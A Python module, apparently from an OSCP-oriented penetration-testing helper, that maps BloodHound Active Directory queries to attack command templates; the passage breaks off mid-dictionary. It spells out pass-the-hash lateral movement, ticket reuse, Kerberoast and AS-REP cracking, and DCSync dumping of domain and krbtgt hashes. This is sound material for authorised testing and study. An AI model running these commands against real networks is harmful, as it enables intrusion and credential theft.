"""
Blood-trail Query to Attack Command Mappings v2

DRY mapping system that:
- Maps bloodtrail query IDs to CRACK command database IDs
- Specifies which result fields contain arrays vs single values
- Defines access types for conditional command filtering
- Filters out invalid targets (groups misused as computers)
"""

from dataclasses import dataclass
from typing import Dict, List, Any, Optional


# =============================================================================
# LATERAL MOVEMENT TECHNIQUE METADATA (multi-technique per access type)
# =============================================================================

@dataclass
class TechniqueInfo:
    """
    Lateral movement technique metadata for educational command suggestions.

    Each technique provides multiple command templates (one per credential type)
    along with OSCP-relevant context about when, why, and how to use it.
    """
    name: str                           # Human-readable technique name
    command_templates: Dict[str, str]   # cred_type -> command template
    ports: List[int]                    # Required network ports
    requirements: List[str]             # Prerequisites for this technique
    noise_level: str                    # Detection risk: low, medium, high
    advantages: str                     # Why use this technique
    disadvantages: str                  # Limitations / risks
    oscp_relevance: str                 # OSCP exam relevance: high, medium, low


# Multiple techniques available for each access type
# Ordered by reliability/common usage (first is default)
LATERAL_TECHNIQUES: Dict[str, List[TechniqueInfo]] = {
    "AdminTo": [
        TechniqueInfo(
            name="PsExec (Impacket)",
            command_templates={
                "password": "impacket-psexec '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<TARGET>",
                "ntlm-hash": "impacket-psexec -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<TARGET>",
                "kerberos-ticket": "KRB5CCNAME=<CRED_VALUE> impacket-psexec -k -no-pass '<DOMAIN>/<USERNAME>'@<TARGET>",
            },
            ports=[445],
            requirements=["SMB port 445 open", "ADMIN$ share accessible", "Local admin rights"],
            noise_level="high",
            advantages="Reliable, gets SYSTEM shell, works with hash/ticket",
            disadvantages="Creates service, logged in Event Log, AV detection",
            oscp_relevance="high",
        ),
        TechniqueInfo(
            name="WMIExec (Impacket)",
            command_templates={
                "password": "impacket-wmiexec '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<TARGET>",
                "ntlm-hash": "impacket-wmiexec -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<TARGET>",
                "kerberos-ticket": "KRB5CCNAME=<CRED_VALUE> impacket-wmiexec -k -no-pass '<DOMAIN>/<USERNAME>'@<TARGET>",
            },
            ports=[135],
            requirements=["RPC port 135 open", "WMI access", "Local admin rights"],
            noise_level="medium",
            advantages="No service creation, runs as user, uses WMI (legitimate)",
            disadvantages="No SYSTEM shell, requires RPC, slower than PsExec",
            oscp_relevance="high",
        ),
        TechniqueInfo(
            name="SMBExec (Impacket)",
            command_templates={
                "password": "impacket-smbexec '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<TARGET>",
                "ntlm-hash": "impacket-smbexec -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<TARGET>",
                "kerberos-ticket": "KRB5CCNAME=<CRED_VALUE> impacket-smbexec -k -no-pass '<DOMAIN>/<USERNAME>'@<TARGET>",
            },
            ports=[445],
            requirements=["SMB port 445 open", "ADMIN$ share accessible", "Local admin rights"],
            noise_level="high",
            advantages="SYSTEM shell, creates fewer artifacts than PsExec",
            disadvantages="Service creation, Event Log entries, AV detection",
            oscp_relevance="medium",
        ),
        TechniqueInfo(
            name="DCOMExec (Impacket)",
            command_templates={
                "password": "impacket-dcomexec -object MMC20 '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<TARGET>",
                "ntlm-hash": "impacket-dcomexec -object MMC20 -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<TARGET>",
                "kerberos-ticket": "KRB5CCNAME=<CRED_VALUE> impacket-dcomexec -object MMC20 -k -no-pass '<DOMAIN>/<USERNAME>'@<TARGET>",
            },
            ports=[135],
            requirements=["RPC port 135 open", "DCOM enabled", "Local admin rights"],
            noise_level="medium",
            advantages="Uses DCOM (often overlooked), runs as user",
            disadvantages="Requires RPC, less reliable than PsExec/WMI",
            oscp_relevance="medium",
        ),
    ],
    "CanPSRemote": [
        TechniqueInfo(
            name="Evil-WinRM",
            command_templates={
                "password": "evil-winrm -i <TARGET> -u <USERNAME> -p '<CRED_VALUE>'",
                "ntlm-hash": "evil-winrm -i <TARGET> -u <USERNAME> -H <CRED_VALUE>",
                "kerberos-ticket": "KRB5CCNAME=<CRED_VALUE> evil-winrm -i <TARGET> -r <DOMAIN>",
            },
            ports=[5985, 5986],
            requirements=["WinRM port 5985/5986 open", "Remote Management Users group"],
            noise_level="low",
            advantages="Interactive PowerShell, file upload/download, stealthy",
            disadvantages="Requires WinRM, may need Remote Management Users membership",
            oscp_relevance="high",
        ),
        TechniqueInfo(
            name="WinRS (Windows)",
            command_templates={
                "password": "winrs -r:<TARGET> -u:<DOMAIN>\\<USERNAME> -p:<CRED_VALUE> cmd",
            },
            ports=[5985, 5986],
            requirements=["WinRM port 5985/5986 open", "Windows client", "Remote Management Users group"],
            noise_level="low",
            advantages="Native Windows, no extra tools, trusted binary",
            disadvantages="Windows-only, less interactive than Evil-WinRM",
            oscp_relevance="medium",
        ),
    ],
    "CanRDP": [
        TechniqueInfo(
            name="xfreerdp",
            command_templates={
                "password": "xfreerdp /v:<TARGET> /u:<USERNAME> /p:'<CRED_VALUE>' /d:<DOMAIN> +clipboard",
                "ntlm-hash": "xfreerdp /v:<TARGET> /u:<USERNAME> /pth:<CRED_VALUE> /d:<DOMAIN> +clipboard",
            },
            ports=[3389],
            requirements=["RDP port 3389 open", "Remote Desktop Users or Administrators group"],
            noise_level="low",
            advantages="Full GUI access, file transfer, clipboard sharing",
            disadvantages="Visible session (noisy), may disconnect other users",
            oscp_relevance="high",
        ),
        TechniqueInfo(
            name="rdesktop",
            command_templates={
                "password": "rdesktop -u <USERNAME> -p '<CRED_VALUE>' -d <DOMAIN> <TARGET>",
            },
            ports=[3389],
            requirements=["RDP port 3389 open", "Remote Desktop Users or Administrators group"],
            noise_level="low",
            advantages="Lightweight, works on older systems",
            disadvantages="Fewer features than xfreerdp, password only",
            oscp_relevance="low",
        ),
    ],
    "ExecuteDCOM": [
        TechniqueInfo(
            name="DCOMExec (MMC20)",
            command_templates={
                "password": "impacket-dcomexec -object MMC20 '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<TARGET>",
                "ntlm-hash": "impacket-dcomexec -object MMC20 -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<TARGET>",
                "kerberos-ticket": "KRB5CCNAME=<CRED_VALUE> impacket-dcomexec -object MMC20 -k -no-pass '<DOMAIN>/<USERNAME>'@<TARGET>",
            },
            ports=[135],
            requirements=["RPC port 135 open", "DCOM enabled", "Local admin or DCOM permission"],
            noise_level="medium",
            advantages="Uses MMC20 Application COM object, often overlooked",
            disadvantages="Requires RPC, may be blocked by firewall",
            oscp_relevance="medium",
        ),
    ],
}


# =============================================================================
# CREDENTIAL CONVERSION ATTACKS (Overpass the Hash)
# =============================================================================

# When user has NTLM hash but target requires Kerberos authentication
# Converts NTLM hash to Kerberos TGT for environments blocking NTLM
CREDENTIAL_CONVERSION: Dict[str, TechniqueInfo] = {
    "overpass-the-hash": TechniqueInfo(
        name="Overpass the Hash (NTLM → TGT)",
        command_templates={
            "ntlm-hash": "impacket-getTGT -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'",
        },
        ports=[88],
        requirements=["Kerberos port 88 reachable", "Valid NTLM hash", "User account not disabled"],
        noise_level="low",
        advantages="Converts hash to TGT for Kerberos-only targets, evades NTLM monitoring",
        disadvantages="Requires Kerberos access, TGT expires (10h default)",
        oscp_relevance="high",
    ),
}


# =============================================================================
# TICKET ATTACKS (Pass the Ticket)
# =============================================================================

# Using/importing Kerberos tickets for authentication
TICKET_ATTACKS: Dict[str, TechniqueInfo] = {
    "export-tickets": TechniqueInfo(
        name="Export Kerberos Tickets (Rubeus)",
        command_templates={
            # Windows - run on compromised host with session
            "session": "Rubeus.exe dump /luid:<LUID> /service:krbtgt /nowrap",
        },
        ports=[],
        requirements=["Local admin on host with target session", "Target logged in"],
        noise_level="medium",
        advantages="Extract tickets for offline use, enables pass-the-ticket",
        disadvantages="Requires session on target, may trigger EDR",
        oscp_relevance="high",
    ),
    "pass-the-ticket": TechniqueInfo(
        name="Pass the Ticket (ccache)",
        command_templates={
            "kerberos-ticket": "export KRB5CCNAME=<CRED_VALUE>",
        },
        ports=[88],
        requirements=["Valid ccache file", "Ticket not expired", "Matching SPN"],
        noise_level="low",
        advantages="Reuse captured tickets, no hash needed, avoids password cracking",
        disadvantages="Tickets expire, need correct service ticket",
        oscp_relevance="high",
    ),
    "convert-kirbi-ccache": TechniqueInfo(
        name="Convert .kirbi to .ccache",
        command_templates={
            "kirbi-file": "impacket-ticketConverter <CRED_VALUE> <OUTPUT>.ccache",
        },
        ports=[],
        requirements=["Valid .kirbi file from Rubeus/Mimikatz"],
        noise_level="low",
        advantages="Convert Windows tickets to Linux format",
        disadvantages="Requires initial ticket extraction",
        oscp_relevance="medium",
    ),
}


# =============================================================================
# HELPER FUNCTIONS FOR LATERAL TECHNIQUES
# =============================================================================

def get_techniques_for_access(access_type: str) -> List[TechniqueInfo]:
    """
    Get all available lateral movement techniques for an access type.

    Args:
        access_type: BloodHound edge type (AdminTo, CanPSRemote, etc.)

    Returns:
        List of TechniqueInfo objects, ordered by reliability
    """
    return LATERAL_TECHNIQUES.get(access_type, [])


def get_technique_command(
    access_type: str,
    cred_type: str,
    technique_index: int = 0
) -> Optional[str]:
    """
    Get command template for a specific technique and credential type.

    Args:
        access_type: BloodHound edge type
        cred_type: password, ntlm-hash, kerberos-ticket
        technique_index: Which technique to use (0 = default/first)

    Returns:
        Command template string or None
    """
    techniques = LATERAL_TECHNIQUES.get(access_type, [])
    if not techniques or technique_index >= len(techniques):
        return None
    return techniques[technique_index].command_templates.get(cred_type)


def needs_overpass_the_hash(cred_type: str, target_ports: List[int]) -> bool:
    """
    Determine if Overpass the Hash is needed.

    Needed when:
    - User has NTLM hash
    - Target only accepts Kerberos (port 88 open, 445 closed)

    Args:
        cred_type: Current credential type
        target_ports: List of open ports on target

    Returns:
        True if Overpass the Hash should be suggested
    """
    if cred_type != "ntlm-hash":
        return False
    # If SMB is blocked but Kerberos is available
    return 88 in target_ports and 445 not in target_ports


# =============================================================================
# QUERY MAPPINGS - DRY structure with array/field awareness
# =============================================================================

# Each mapping defines:
#   commands:      List of CRACK command IDs to suggest
#   access_type:   Edge type for conditional filtering (AdminTo, CanRDP, etc.)
#   array_field:   Result field containing array of targets (for expansion)
#   user_field:    Result field containing the user principal
#   target_field:  For single-target queries (user IS the target)
#   filter_groups: Skip group names that aren't valid computer targets
#   domain_level:  True for domain-wide commands (DCSync, etc.)

QUERY_COMMAND_MAPPINGS: Dict[str, Any] = {
    # ==================== LATERAL MOVEMENT (Array fields) ====================
    "lateral-adminto-nonpriv": {
        "commands": ["impacket-psexec", "impacket-wmiexec", "impacket-smbexec"],
        "access_type": "AdminTo",
        "array_field": "AdminOnComputers",
        "user_field": "User",
        "permissions_required": "Local admin on target (AdminTo edge)",
    },
    "lateral-all-admins-per-computer": {
        "commands": ["impacket-psexec"],
        "access_type": "AdminTo",
        "array_field": "LocalAdmins",  # Users who can admin
        "target_field": "Computer",     # Single computer per row
        "filter_groups": True,          # Filter out "DOMAIN ADMINS@..." etc.
        "permissions_required": "Local admin on target (AdminTo edge)",
    },
    "lateral-rdp-targets": {
        "commands": ["xfreerdp-connect"],
        "access_type": "CanRDP",
        "array_field": "RDPTargets",
        "user_field": "User",
        "permissions_required": "Remote Desktop Users or Administrators group",
    },
    "lateral-psremote-targets": {
        "commands": ["evil-winrm-shell"],
        "access_type": "CanPSRemote",
        "array_field": "PSRemoteTargets",
        "user_field": "User",
        "permissions_required": "Remote Management Users or Administrators group",
    },
    "lateral-dcom-targets": {
        "commands": ["impacket-wmiexec"],
        "access_type": "ExecuteDCOM",
        "array_field": "DCOMTargets",
        "user_field": "User",
        "permissions_required": "DCOM execution rights on target",
    },
    "lateral-da-sessions-workstations": {
        "commands": ["impacket-psexec"],
        "access_type": "HasSession",
        "target_field": "Workstation",
        "array_field": "PrivilegedSessions",  # Who's logged in
        "context": "Credential harvest - privileged session on target",
        "permissions_required": "Local admin on workstation to dump creds",
    },
    "lateral-sessions-on-computer": {
        "commands": ["impacket-psexec"],
        "access_type": "HasSession",
        "target_field": "Computer",
        "user_field": "LoggedOnUser",
        "context": "Credential harvest opportunity",
        "permissions_required": "Local admin on target to dump creds",
    },
    "lateral-user-access-all": {
        "commands": ["impacket-psexec", "evil-winrm-shell", "xfreerdp-connect"],
        "target_field": "Target",
        "access_type_field": "AccessType",  # Dynamic: AdminTo|CanRDP|CanPSRemote
        "permissions_required": "Varies by access type (AdminTo/CanRDP/CanPSRemote)",
    },
    "lateral-domain-users-admin": {
        "commands": ["impacket-psexec"],
        "access_type": "AdminTo",
        "target_field": "Computer",
        "context": "Domain Users = local admin (any user can compromise)",
        "permissions_required": "Any domain user (misconfigured local admin)",
    },
    "lateral-da-sessions": {
        "commands": ["impacket-psexec"],
        "access_type": "HasSession",
        "target_field": "Computer",
        "context": "DA session - prime mimikatz target",
        "permissions_required": "Local admin on target to dump creds",
    },

    # ==================== QUICK WINS (Single value targets) ====================
    "quick-asrep-roastable": {
        "commands": ["impacket-getnpusers-asreproast"],
        "access_type": None,  # No lateral access check
        "discovery_command": True,  # Enumerates targets
        "auth_free": True,  # Discovered user IS the command target, no attacker auth needed
        "target_field": "User",  # What we discovered
        "context": "AS-REP roast - no auth required",
        "permissions_required": "None (pre-auth disabled on target)",
        "post_success": [
            {"description": "Crack the hash", "command": "hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt"},
            {"description": "Validate credentials", "command": "crackmapexec smb <DC_IP> -u '<CRACKED_USER>' -p '<PASSWORD>'"},
            {"description": "Check user access", "command": "bloodtrail --run-query owned-what-can-access --var USER=<CRACKED_USER>@<DOMAIN>"},
            {"description": "Mark as owned in BloodHound", "command": None},
        ],
    },
    "quick-kerberoastable": {
        "commands": ["impacket-getuserspns-kerberoast"],
        "access_type": None,
        "discovery_command": True,  # Enumerates all SPNs, uses attacker creds
        "target_field": "ServiceAccount",  # What we discovered
        "context": "Kerberoast - request TGS for offline cracking",
        "permissions_required": "Any authenticated domain user",
        "post_success": [
            {"description": "Crack the hash", "command": "hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt"},
            {"description": "Validate credentials", "command": "crackmapexec smb <DC_IP> -u '<CRACKED_USER>' -p '<PASSWORD>'"},
            {"description": "Check user access", "command": "bloodtrail --run-query owned-what-can-access --var USER=<CRACKED_USER>@<DOMAIN>"},
            {"description": "Mark as owned in BloodHound", "command": None},
        ],
    },
    "quick-kerberoastable-privileged": {
        # No commands - this is a PRIORITIZATION query, not a separate attack
        # Kerberoasting gets ALL SPNs in one request; this query just highlights
        # which results to crack first. Command shown in quick-kerberoastable.
        "commands": [],
        "access_type": None,
        "discovery_command": True,
        "target_field": "HighValueTarget",
        "context": "Priority target - crack this hash first",
        "permissions_required": "Any authenticated domain user",
    },
    "quick-unconstrained-delegation": {
        "commands": ["rubeus-monitor"],
        "access_type": None,
        "target_field": "Computer",
        "context": "Unconstrained delegation - monitor for TGT capture",
        "permissions_required": "Local admin on unconstrained delegation host",
    },
    "quick-constrained-delegation": {
        "commands": ["rubeus-s4u-impersonate", "impacket-getST-constrained"],
        "access_type": None,
        "target_field": "Principal",
        "context": "Constrained delegation - S4U2Self/S4U2Proxy",
        "permissions_required": "Control of delegating principal (password/hash/TGT)",
    },
    "quick-password-in-description": {
        "commands": ["crackmapexec-smb-spray", "evil-winrm-shell"],
        "access_type": None,
        "user_field": "User",
        "context": "Password in description - validate and use",
        "permissions_required": "LDAP read access (any domain user)",
        "post_success": [
            {"description": "Validate the password from description", "command": "crackmapexec smb <DC_IP> -u '<USER>' -p '<PASSWORD_FROM_DESC>'"},
            {"description": "Check user access", "command": "bloodtrail --run-query owned-what-can-access --var USER=<USER>@<DOMAIN>"},
            {"description": "Mark as owned in BloodHound", "command": None},
        ],
    },

    # ==================== PRIVILEGE ESCALATION ====================
    "privesc-dcsync-rights": {
        "commands": ["ad-dcsync-impacket-secretsdump-user"],
        "access_type": "DCSync",
        "principal_field": "Principal",
        "filter_groups": True,  # Filter "DOMAIN CONTROLLERS@..." etc.
        "domain_level": True,
        "context": "DCSync - dump domain hashes",
        "permissions_required": "GetChanges + GetChangesAll on domain object",
        "post_success": [
            {"description": "Dump all hashes", "command": "impacket-secretsdump -just-dc <DOMAIN>/<USER>:'<PASSWORD>'@<DC_IP>"},
            {"description": "Extract krbtgt hash for Golden Ticket", "command": "impacket-secretsdump -just-dc-user krbtgt <DOMAIN>/<USER>:'<PASSWORD>'@<DC_IP>"},
            {"description": "Pass-the-Hash as Administrator", "command": "impacket-psexec -hashes :<NTLM_HASH> <DOMAIN>/Administrator@<TARGET>"},
        ],
    },
    "privesc-genericall-highvalue": {
        "commands": ["crackmapexec-smb-spray"],  # Reset password then spray
        "access_type": "GenericAll",
        "user_field": "Attacker",
        "target_field": "Target",
        "context": "GenericAll - reset password or add to group",
        "permissions_required": "GenericAll ACL on target object",
    },
    "privesc-shadow-admins": {
        "commands": ["ad-dcsync-impacket-secretsdump-user"],
        "access_type": "GenericAll",
        "user_field": "Attacker",
        "target_field": "Victim",
        "context": "Shadow admin - control over DA",
        "permissions_required": "GenericAll over privileged user/group",
    },
    "privesc-force-change-password": {
        "commands": ["crackmapexec-smb-spray"],  # Reset password then spray
        "access_type": "ForceChangePassword",
        "user_field": "Attacker",
        "target_field": "Victim",
        "context": "ForceChangePassword - reset and use",
        "permissions_required": "User-Force-Change-Password extended right",
    },
    "privesc-genericwrite": {
        "commands": ["impacket-getuserspns-kerberoast"],
        "access_type": "GenericWrite",
        "user_field": "Attacker",
        "target_field": "Victim",
        "context": "GenericWrite - add SPN then Kerberoast",
        "permissions_required": "GenericWrite on target user",
    },
    "privesc-add-member": {
        "commands": ["impacket-psexec"],
        "access_type": "AddMember",
        "user_field": "Attacker",
        "target_field": "Group",
        "context": "AddMember - add self to admin group",
        "permissions_required": "AddMember/WriteProperty on group",
    },
    "privesc-readgmsapassword": {
        "commands": ["gmsadumper", "evil-winrm-shell"],
        "access_type": "ReadGMSAPassword",
        "user_field": "Reader",
        "target_field": "GMSA",
        "context": "Read GMSA password - use for access",
        "permissions_required": "In PrincipalsAllowedToRetrieveManagedPassword",
    },

    # ==================== ATTACK CHAINS ====================
    "chain-shortest-to-da": "BUILD_SEQUENCE",
    "chain-all-paths-to-da": "BUILD_SEQUENCE",
    "chain-owned-to-pivot-to-da": "BUILD_SEQUENCE",
    "chain-credential-harvest": "BUILD_SEQUENCE",
    "chain-complete-compromise": "BUILD_SEQUENCE",
    "chain-lateral-to-privilege": "BUILD_SEQUENCE",

    # ==================== OWNED PRINCIPAL ====================
    "owned-what-can-access": {
        "commands": ["impacket-psexec", "evil-winrm-shell", "xfreerdp-connect"],
        "target_field": "Target",
        "access_type_field": "AccessType",  # Dynamic from query result
        "permissions_required": "Owned user credentials + their access rights",
    },
    "owned-path-to-da": "BUILD_SEQUENCE",
    "owned-first-hop": {
        "commands": ["impacket-psexec", "evil-winrm-shell"],
        "target_field": "Target",
        "access_type_field": "AccessType",
        "permissions_required": "Owned user credentials + their access rights",
    },
    "owned-admin-on": {
        "commands": ["impacket-psexec", "impacket-wmiexec"],
        "access_type": "AdminTo",
        "target_field": "Target",
        "permissions_required": "Owned user with AdminTo on target",
    },
    "owned-cred-harvest-targets": {
        "commands": ["impacket-psexec"],
        "access_type": "HasSession",
        "target_field": "Computer",
        "context": "Credential harvest from DA session",
        "permissions_required": "Local admin on target to dump creds",
    },

    # ==================== DELEGATION QUERIES ====================
    "delegation-rbcd-targets": {
        "commands": ["rbcd-getST", "rubeus-s4u-impersonate"],
        "access_type": "AllowedToAct",
        "target_field": "RBCDTarget",
        "array_field": "AllowedPrincipals",
        "context": "RBCD - impersonate users to target",
        "permissions_required": "Control of principal in msDS-AllowedToActOnBehalfOfOtherIdentity",
    },
    "delegation-rbcd-writers": {
        "commands": ["rbcd-set-msds", "bloodyad-rbcd"],
        "access_type": "WriteAccountRestrictions",
        "user_field": "Attacker",
        "target_field": "TargetComputer",
        "context": "Can configure RBCD on target computer",
        "permissions_required": "WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity",
    },
    "delegation-constrained-abuse": {
        "commands": ["rubeus-s4u-impersonate", "impacket-getST-constrained"],
        "access_type": "AllowedToDelegate",
        "user_field": "DelegatingPrincipal",
        "array_field": "DelegationTargets",
        "context": "Constrained delegation - S4U2Self/S4U2Proxy",
        "permissions_required": "Control of delegating principal (password/hash/TGT)",
    },
    "delegation-constrained-to-dc": {
        "commands": ["rubeus-s4u-impersonate", "impacket-getST-constrained"],
        "access_type": "AllowedToDelegate",
        "user_field": "DelegatingPrincipal",
        "target_field": "DomainController",
        "context": "Constrained delegation to DC - high value",
        "permissions_required": "Control of delegating principal (password/hash/TGT)",
    },
    "delegation-unconstrained": {
        "commands": ["rubeus-monitor", "rubeus-tgtdeleg"],
        "access_type": None,
        "target_field": "Computer",
        "context": "Unconstrained delegation - TGT capture target",
        "permissions_required": "Local admin on unconstrained delegation host",
    },
    "delegation-unconstrained-nondc": {
        "commands": ["rubeus-monitor", "petitpotam-coerce", "coercer-coerce"],
        "access_type": None,
        "target_field": "Computer",
        "context": "Non-DC unconstrained - coerce + capture TGT",
        "permissions_required": "Local admin on unconstrained host + coercion capability",
    },
    "delegation-user-unconstrained": {
        "commands": ["rubeus-monitor"],
        "access_type": None,
        "user_field": "User",
        "context": "User with unconstrained delegation",
        "permissions_required": "Control of user with unconstrained delegation",
    },
    "delegation-rbcd-chain": {
        "commands": ["rbcd-set-msds", "rbcd-getST"],
        "access_type": "WriteAccountRestrictions",
        "user_field": "Attacker",
        "target_field": "TargetComputer",
        "array_field": "PrivilegedSessions",
        "context": "Full RBCD chain - write + impersonate to cred harvest",
        "permissions_required": "WriteProperty on target + control of computer account",
    },
    "delegation-add-allowed-to-act": {
        "commands": ["rbcd-set-msds"],
        "access_type": "AddAllowedToAct",
        "user_field": "Attacker",
        "target_field": "TargetComputer",
        "context": "AddAllowedToAct - configure RBCD directly",
        "permissions_required": "AddAllowedToAct permission on target computer",
    },
    "delegation-protocol-transition": {
        "commands": ["rubeus-s4u-impersonate", "impacket-getST-constrained"],
        "access_type": "AllowedToDelegate",
        "user_field": "Principal",
        "context": "Protocol transition - S4U2Self without user auth",
        "permissions_required": "Control of principal with TRUSTED_TO_AUTH_FOR_DELEGATION",
    },

    # ==================== ADCS QUERIES ====================
    "adcs-esc1-vulnerable": {
        "commands": ["certipy-req-esc1"],
        "access_type": "ADCSESC1",
        "user_field": "Attacker",
        "target_field": "VulnerableTemplate",
        "context": "ESC1 - Request certificate as any user",
        "permissions_required": "Enroll rights on vulnerable template",
    },
    "adcs-esc3-enrollment-agents": {
        "commands": ["certipy-req-esc1"],  # After getting agent cert
        "access_type": "ADCSESC3",
        "user_field": "Attacker",
        "target_field": "AgentTemplate",
        "context": "ESC3 - Enrollment agent abuse",
        "permissions_required": "Enrollment agent certificate",
    },
    "adcs-esc4-template-write": {
        "commands": ["certipy-req-esc4"],
        "access_type": "ADCSESC4",
        "user_field": "Attacker",
        "target_field": "ModifiableTemplate",
        "context": "ESC4 - Modify template for ESC1",
        "permissions_required": "WriteProperty/WriteDacl on certificate template",
    },
    "adcs-esc5-pki-object-acls": {
        "commands": ["certipy-find"],
        "access_type": "ADCSESC5",
        "user_field": "Attacker",
        "target_field": "PKIObject",
        "context": "ESC5 - PKI object ACL abuse",
        "permissions_required": "WriteProperty/WriteDacl on PKI objects",
    },
    "adcs-esc6a-editf-flag": {
        "commands": ["certipy-req-esc1"],  # SAN enabled by flag
        "access_type": "ADCSESC6a",
        "user_field": "Attacker",
        "target_field": "VulnerableCA",
        "context": "ESC6a - EDITF_ATTRIBUTESUBJECTALTNAME2 enabled",
        "permissions_required": "Enroll rights on any template (CA misconfigured)",
    },
    "adcs-esc6b-issuance-requirements": {
        "commands": ["certipy-req-esc1"],
        "access_type": "ADCSESC6b",
        "user_field": "Attacker",
        "target_field": "VulnerableCA",
        "context": "ESC6b - Weak issuance requirements",
        "permissions_required": "Enroll rights (weak manager approval)",
    },
    "adcs-esc7-ca-acls": {
        "commands": ["certipy-req-esc7"],
        "access_type": "ADCSESC7",
        "user_field": "Attacker",
        "target_field": "TargetCA",
        "context": "ESC7 - ManageCA rights abuse",
        "permissions_required": "ManageCA or ManageCertificates on CA",
    },
    "adcs-esc9a-no-security-extension": {
        "commands": ["certipy-req-esc1", "certipy-auth"],
        "access_type": "ADCSESC9a",
        "user_field": "Attacker",
        "target_field": "Target",
        "context": "ESC9a - No security extension bypass",
        "permissions_required": "GenericWrite on target + enroll rights",
    },
    "adcs-esc9b-weak-mapping": {
        "commands": ["certipy-req-esc1", "certipy-auth"],
        "access_type": "ADCSESC9b",
        "user_field": "Attacker",
        "target_field": "Target",
        "context": "ESC9b - Weak certificate mapping",
        "permissions_required": "GenericWrite on target + enroll rights",
    },
    "adcs-esc10a-weak-cert-binding": {
        "commands": ["certipy-req-esc1", "certipy-auth"],
        "access_type": "ADCSESC10a",
        "user_field": "Attacker",
        "target_field": "Target",
        "context": "ESC10a - Weak certificate binding",
        "permissions_required": "Enroll rights (StrongCertificateBindingEnforcement=0)",
    },
    "adcs-esc10b-shadow-credentials": {
        "commands": ["certipy-shadow"],
        "access_type": "ADCSESC10b",
        "user_field": "Attacker",
        "target_field": "Target",
        "context": "ESC10b - Shadow credentials via ADCS",
        "permissions_required": "GenericWrite on target for msDS-KeyCredentialLink",
    },
    "adcs-esc13-oid-group": {
        "commands": ["certipy-req-esc1"],
        "access_type": "ADCSESC13",
        "user_field": "Attacker",
        "target_field": "Target",
        "context": "ESC13 - OID group link privilege escalation",
        "permissions_required": "Enroll on template with issuance policy linked to group",
    },
    "adcs-golden-cert": {
        "commands": ["certipy-forge"],
        "access_type": "GoldenCert",
        "user_field": "Attacker",
        "target_field": "CompromisedCA",
        "domain_level": True,
        "context": "Golden Certificate - CA key compromise",
        "permissions_required": "CA private key (backup/DVCD/local admin on CA)",
    },
    "adcs-enroll-on-behalf": {
        "commands": ["certipy-req-esc1"],
        "access_type": "EnrollOnBehalfOf",
        "user_field": "EnrollmentAgent",
        "target_field": "Victim",
        "context": "Enrollment agent impersonation",
        "permissions_required": "Valid enrollment agent certificate",
    },
    "adcs-enrollment-targets": {
        "commands": ["certipy-req-esc1", "certify-request"],
        "access_type": "Enroll",
        "user_field": "Principal",
        "target_field": "Template",
        "context": "Certificate enrollment rights",
        "permissions_required": "Enroll permission on template",
    },
    "adcs-manage-ca": {
        "commands": ["certipy-req-esc7"],
        "access_type": "ManageCA",
        "user_field": "Attacker",
        "target_field": "TargetCA",
        "context": "CA management rights",
        "permissions_required": "ManageCA right on Certificate Authority",
    },
    "adcs-ca-servers": {
        "commands": ["certipy-find", "certify-find"],
        "access_type": None,
        "target_field": "CAServer",
        "context": "Certificate Authority enumeration",
        "discovery_command": True,
        "permissions_required": "Any authenticated domain user",
    },
    "adcs-certificate-templates": {
        "commands": ["certipy-find", "certify-find"],
        "access_type": None,
        "target_field": "Template",
        "context": "Certificate template enumeration",
        "discovery_command": True,
        "permissions_required": "Any authenticated domain user",
    },
    "adcs-all-esc-paths": {
        "commands": ["certipy-find"],
        "access_type": None,
        "context": "All ESC attack paths summary",
        "discovery_command": True,
        "permissions_required": "Any authenticated domain user",
    },
    "adcs-ntauth-store": {
        "commands": ["certipy-find"],
        "access_type": "GenericAll",
        "user_field": "Attacker",
        "target_field": "NTAuthStore",
        "context": "NTAuthCertificates modification rights",
        "permissions_required": "GenericAll on NTAuthCertificates container",
    },

    # ==================== COERCION / LATERAL (NEW) ====================
    "lateral-coerce-to-tgt": {
        "commands": ["petitpotam-coerce", "coercer-coerce", "printerbug-trigger", "dfscoerce-trigger"],
        "access_type": "CoerceToTGT",
        "user_field": "CoercionHost",
        "target_field": "CanCaptureTGTFrom",
        "context": "Coerce authentication to capture TGT",
        "permissions_required": "Network access to target + listener on unconstrained host",
    },
    "lateral-sid-history": {
        "commands": ["impacket-psexec", "impacket-wmiexec"],
        "access_type": "HasSIDHistory",
        "user_field": "Principal",
        "target_field": "HasSIDOf",
        "context": "SID History grants inherited permissions",
        "permissions_required": "Control of principal with SID history",
    },
    "lateral-trust-abuse": {
        "commands": ["impacket-psexec"],
        "access_type": "TrustedBy",
        "user_field": "TrustingDomain",
        "target_field": "TrustedDomain",
        "context": "Cross-domain trust relationship",
        "permissions_required": "Domain admin in trusting domain (for golden ticket)",
    },

    # ==================== PRIVILEGE ESCALATION (NEW) ====================
    "privesc-write-spn": {
        "commands": ["impacket-getuserspns-kerberoast"],
        "access_type": "WriteSPN",
        "user_field": "Attacker",
        "target_field": "Target",
        "context": "Add SPN for targeted Kerberoasting",
        "permissions_required": "WriteProperty on servicePrincipalName",
    },
    "privesc-write-account-restrictions": {
        "commands": ["rbcd-set-msds", "bloodyad-rbcd"],
        "access_type": "WriteAccountRestrictions",
        "user_field": "Attacker",
        "target_field": "RBCDTarget",
        "context": "Configure RBCD on computer",
        "permissions_required": "WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity",
    },
    "privesc-sync-laps": {
        "commands": ["laps-password-cme", "laps-password-ldapsearch"],
        "access_type": "SyncLAPSPassword",
        "user_field": "Principal",
        "array_field": "Computers",
        "domain_level": True,
        "context": "Domain-wide LAPS sync rights",
        "permissions_required": "SyncLAPSPassword extended right (domain-wide)",
    },
    "privesc-add-allowed-to-act": {
        "commands": ["rbcd-set-msds"],
        "access_type": "AddAllowedToAct",
        "user_field": "Attacker",
        "target_field": "RBCDTarget",
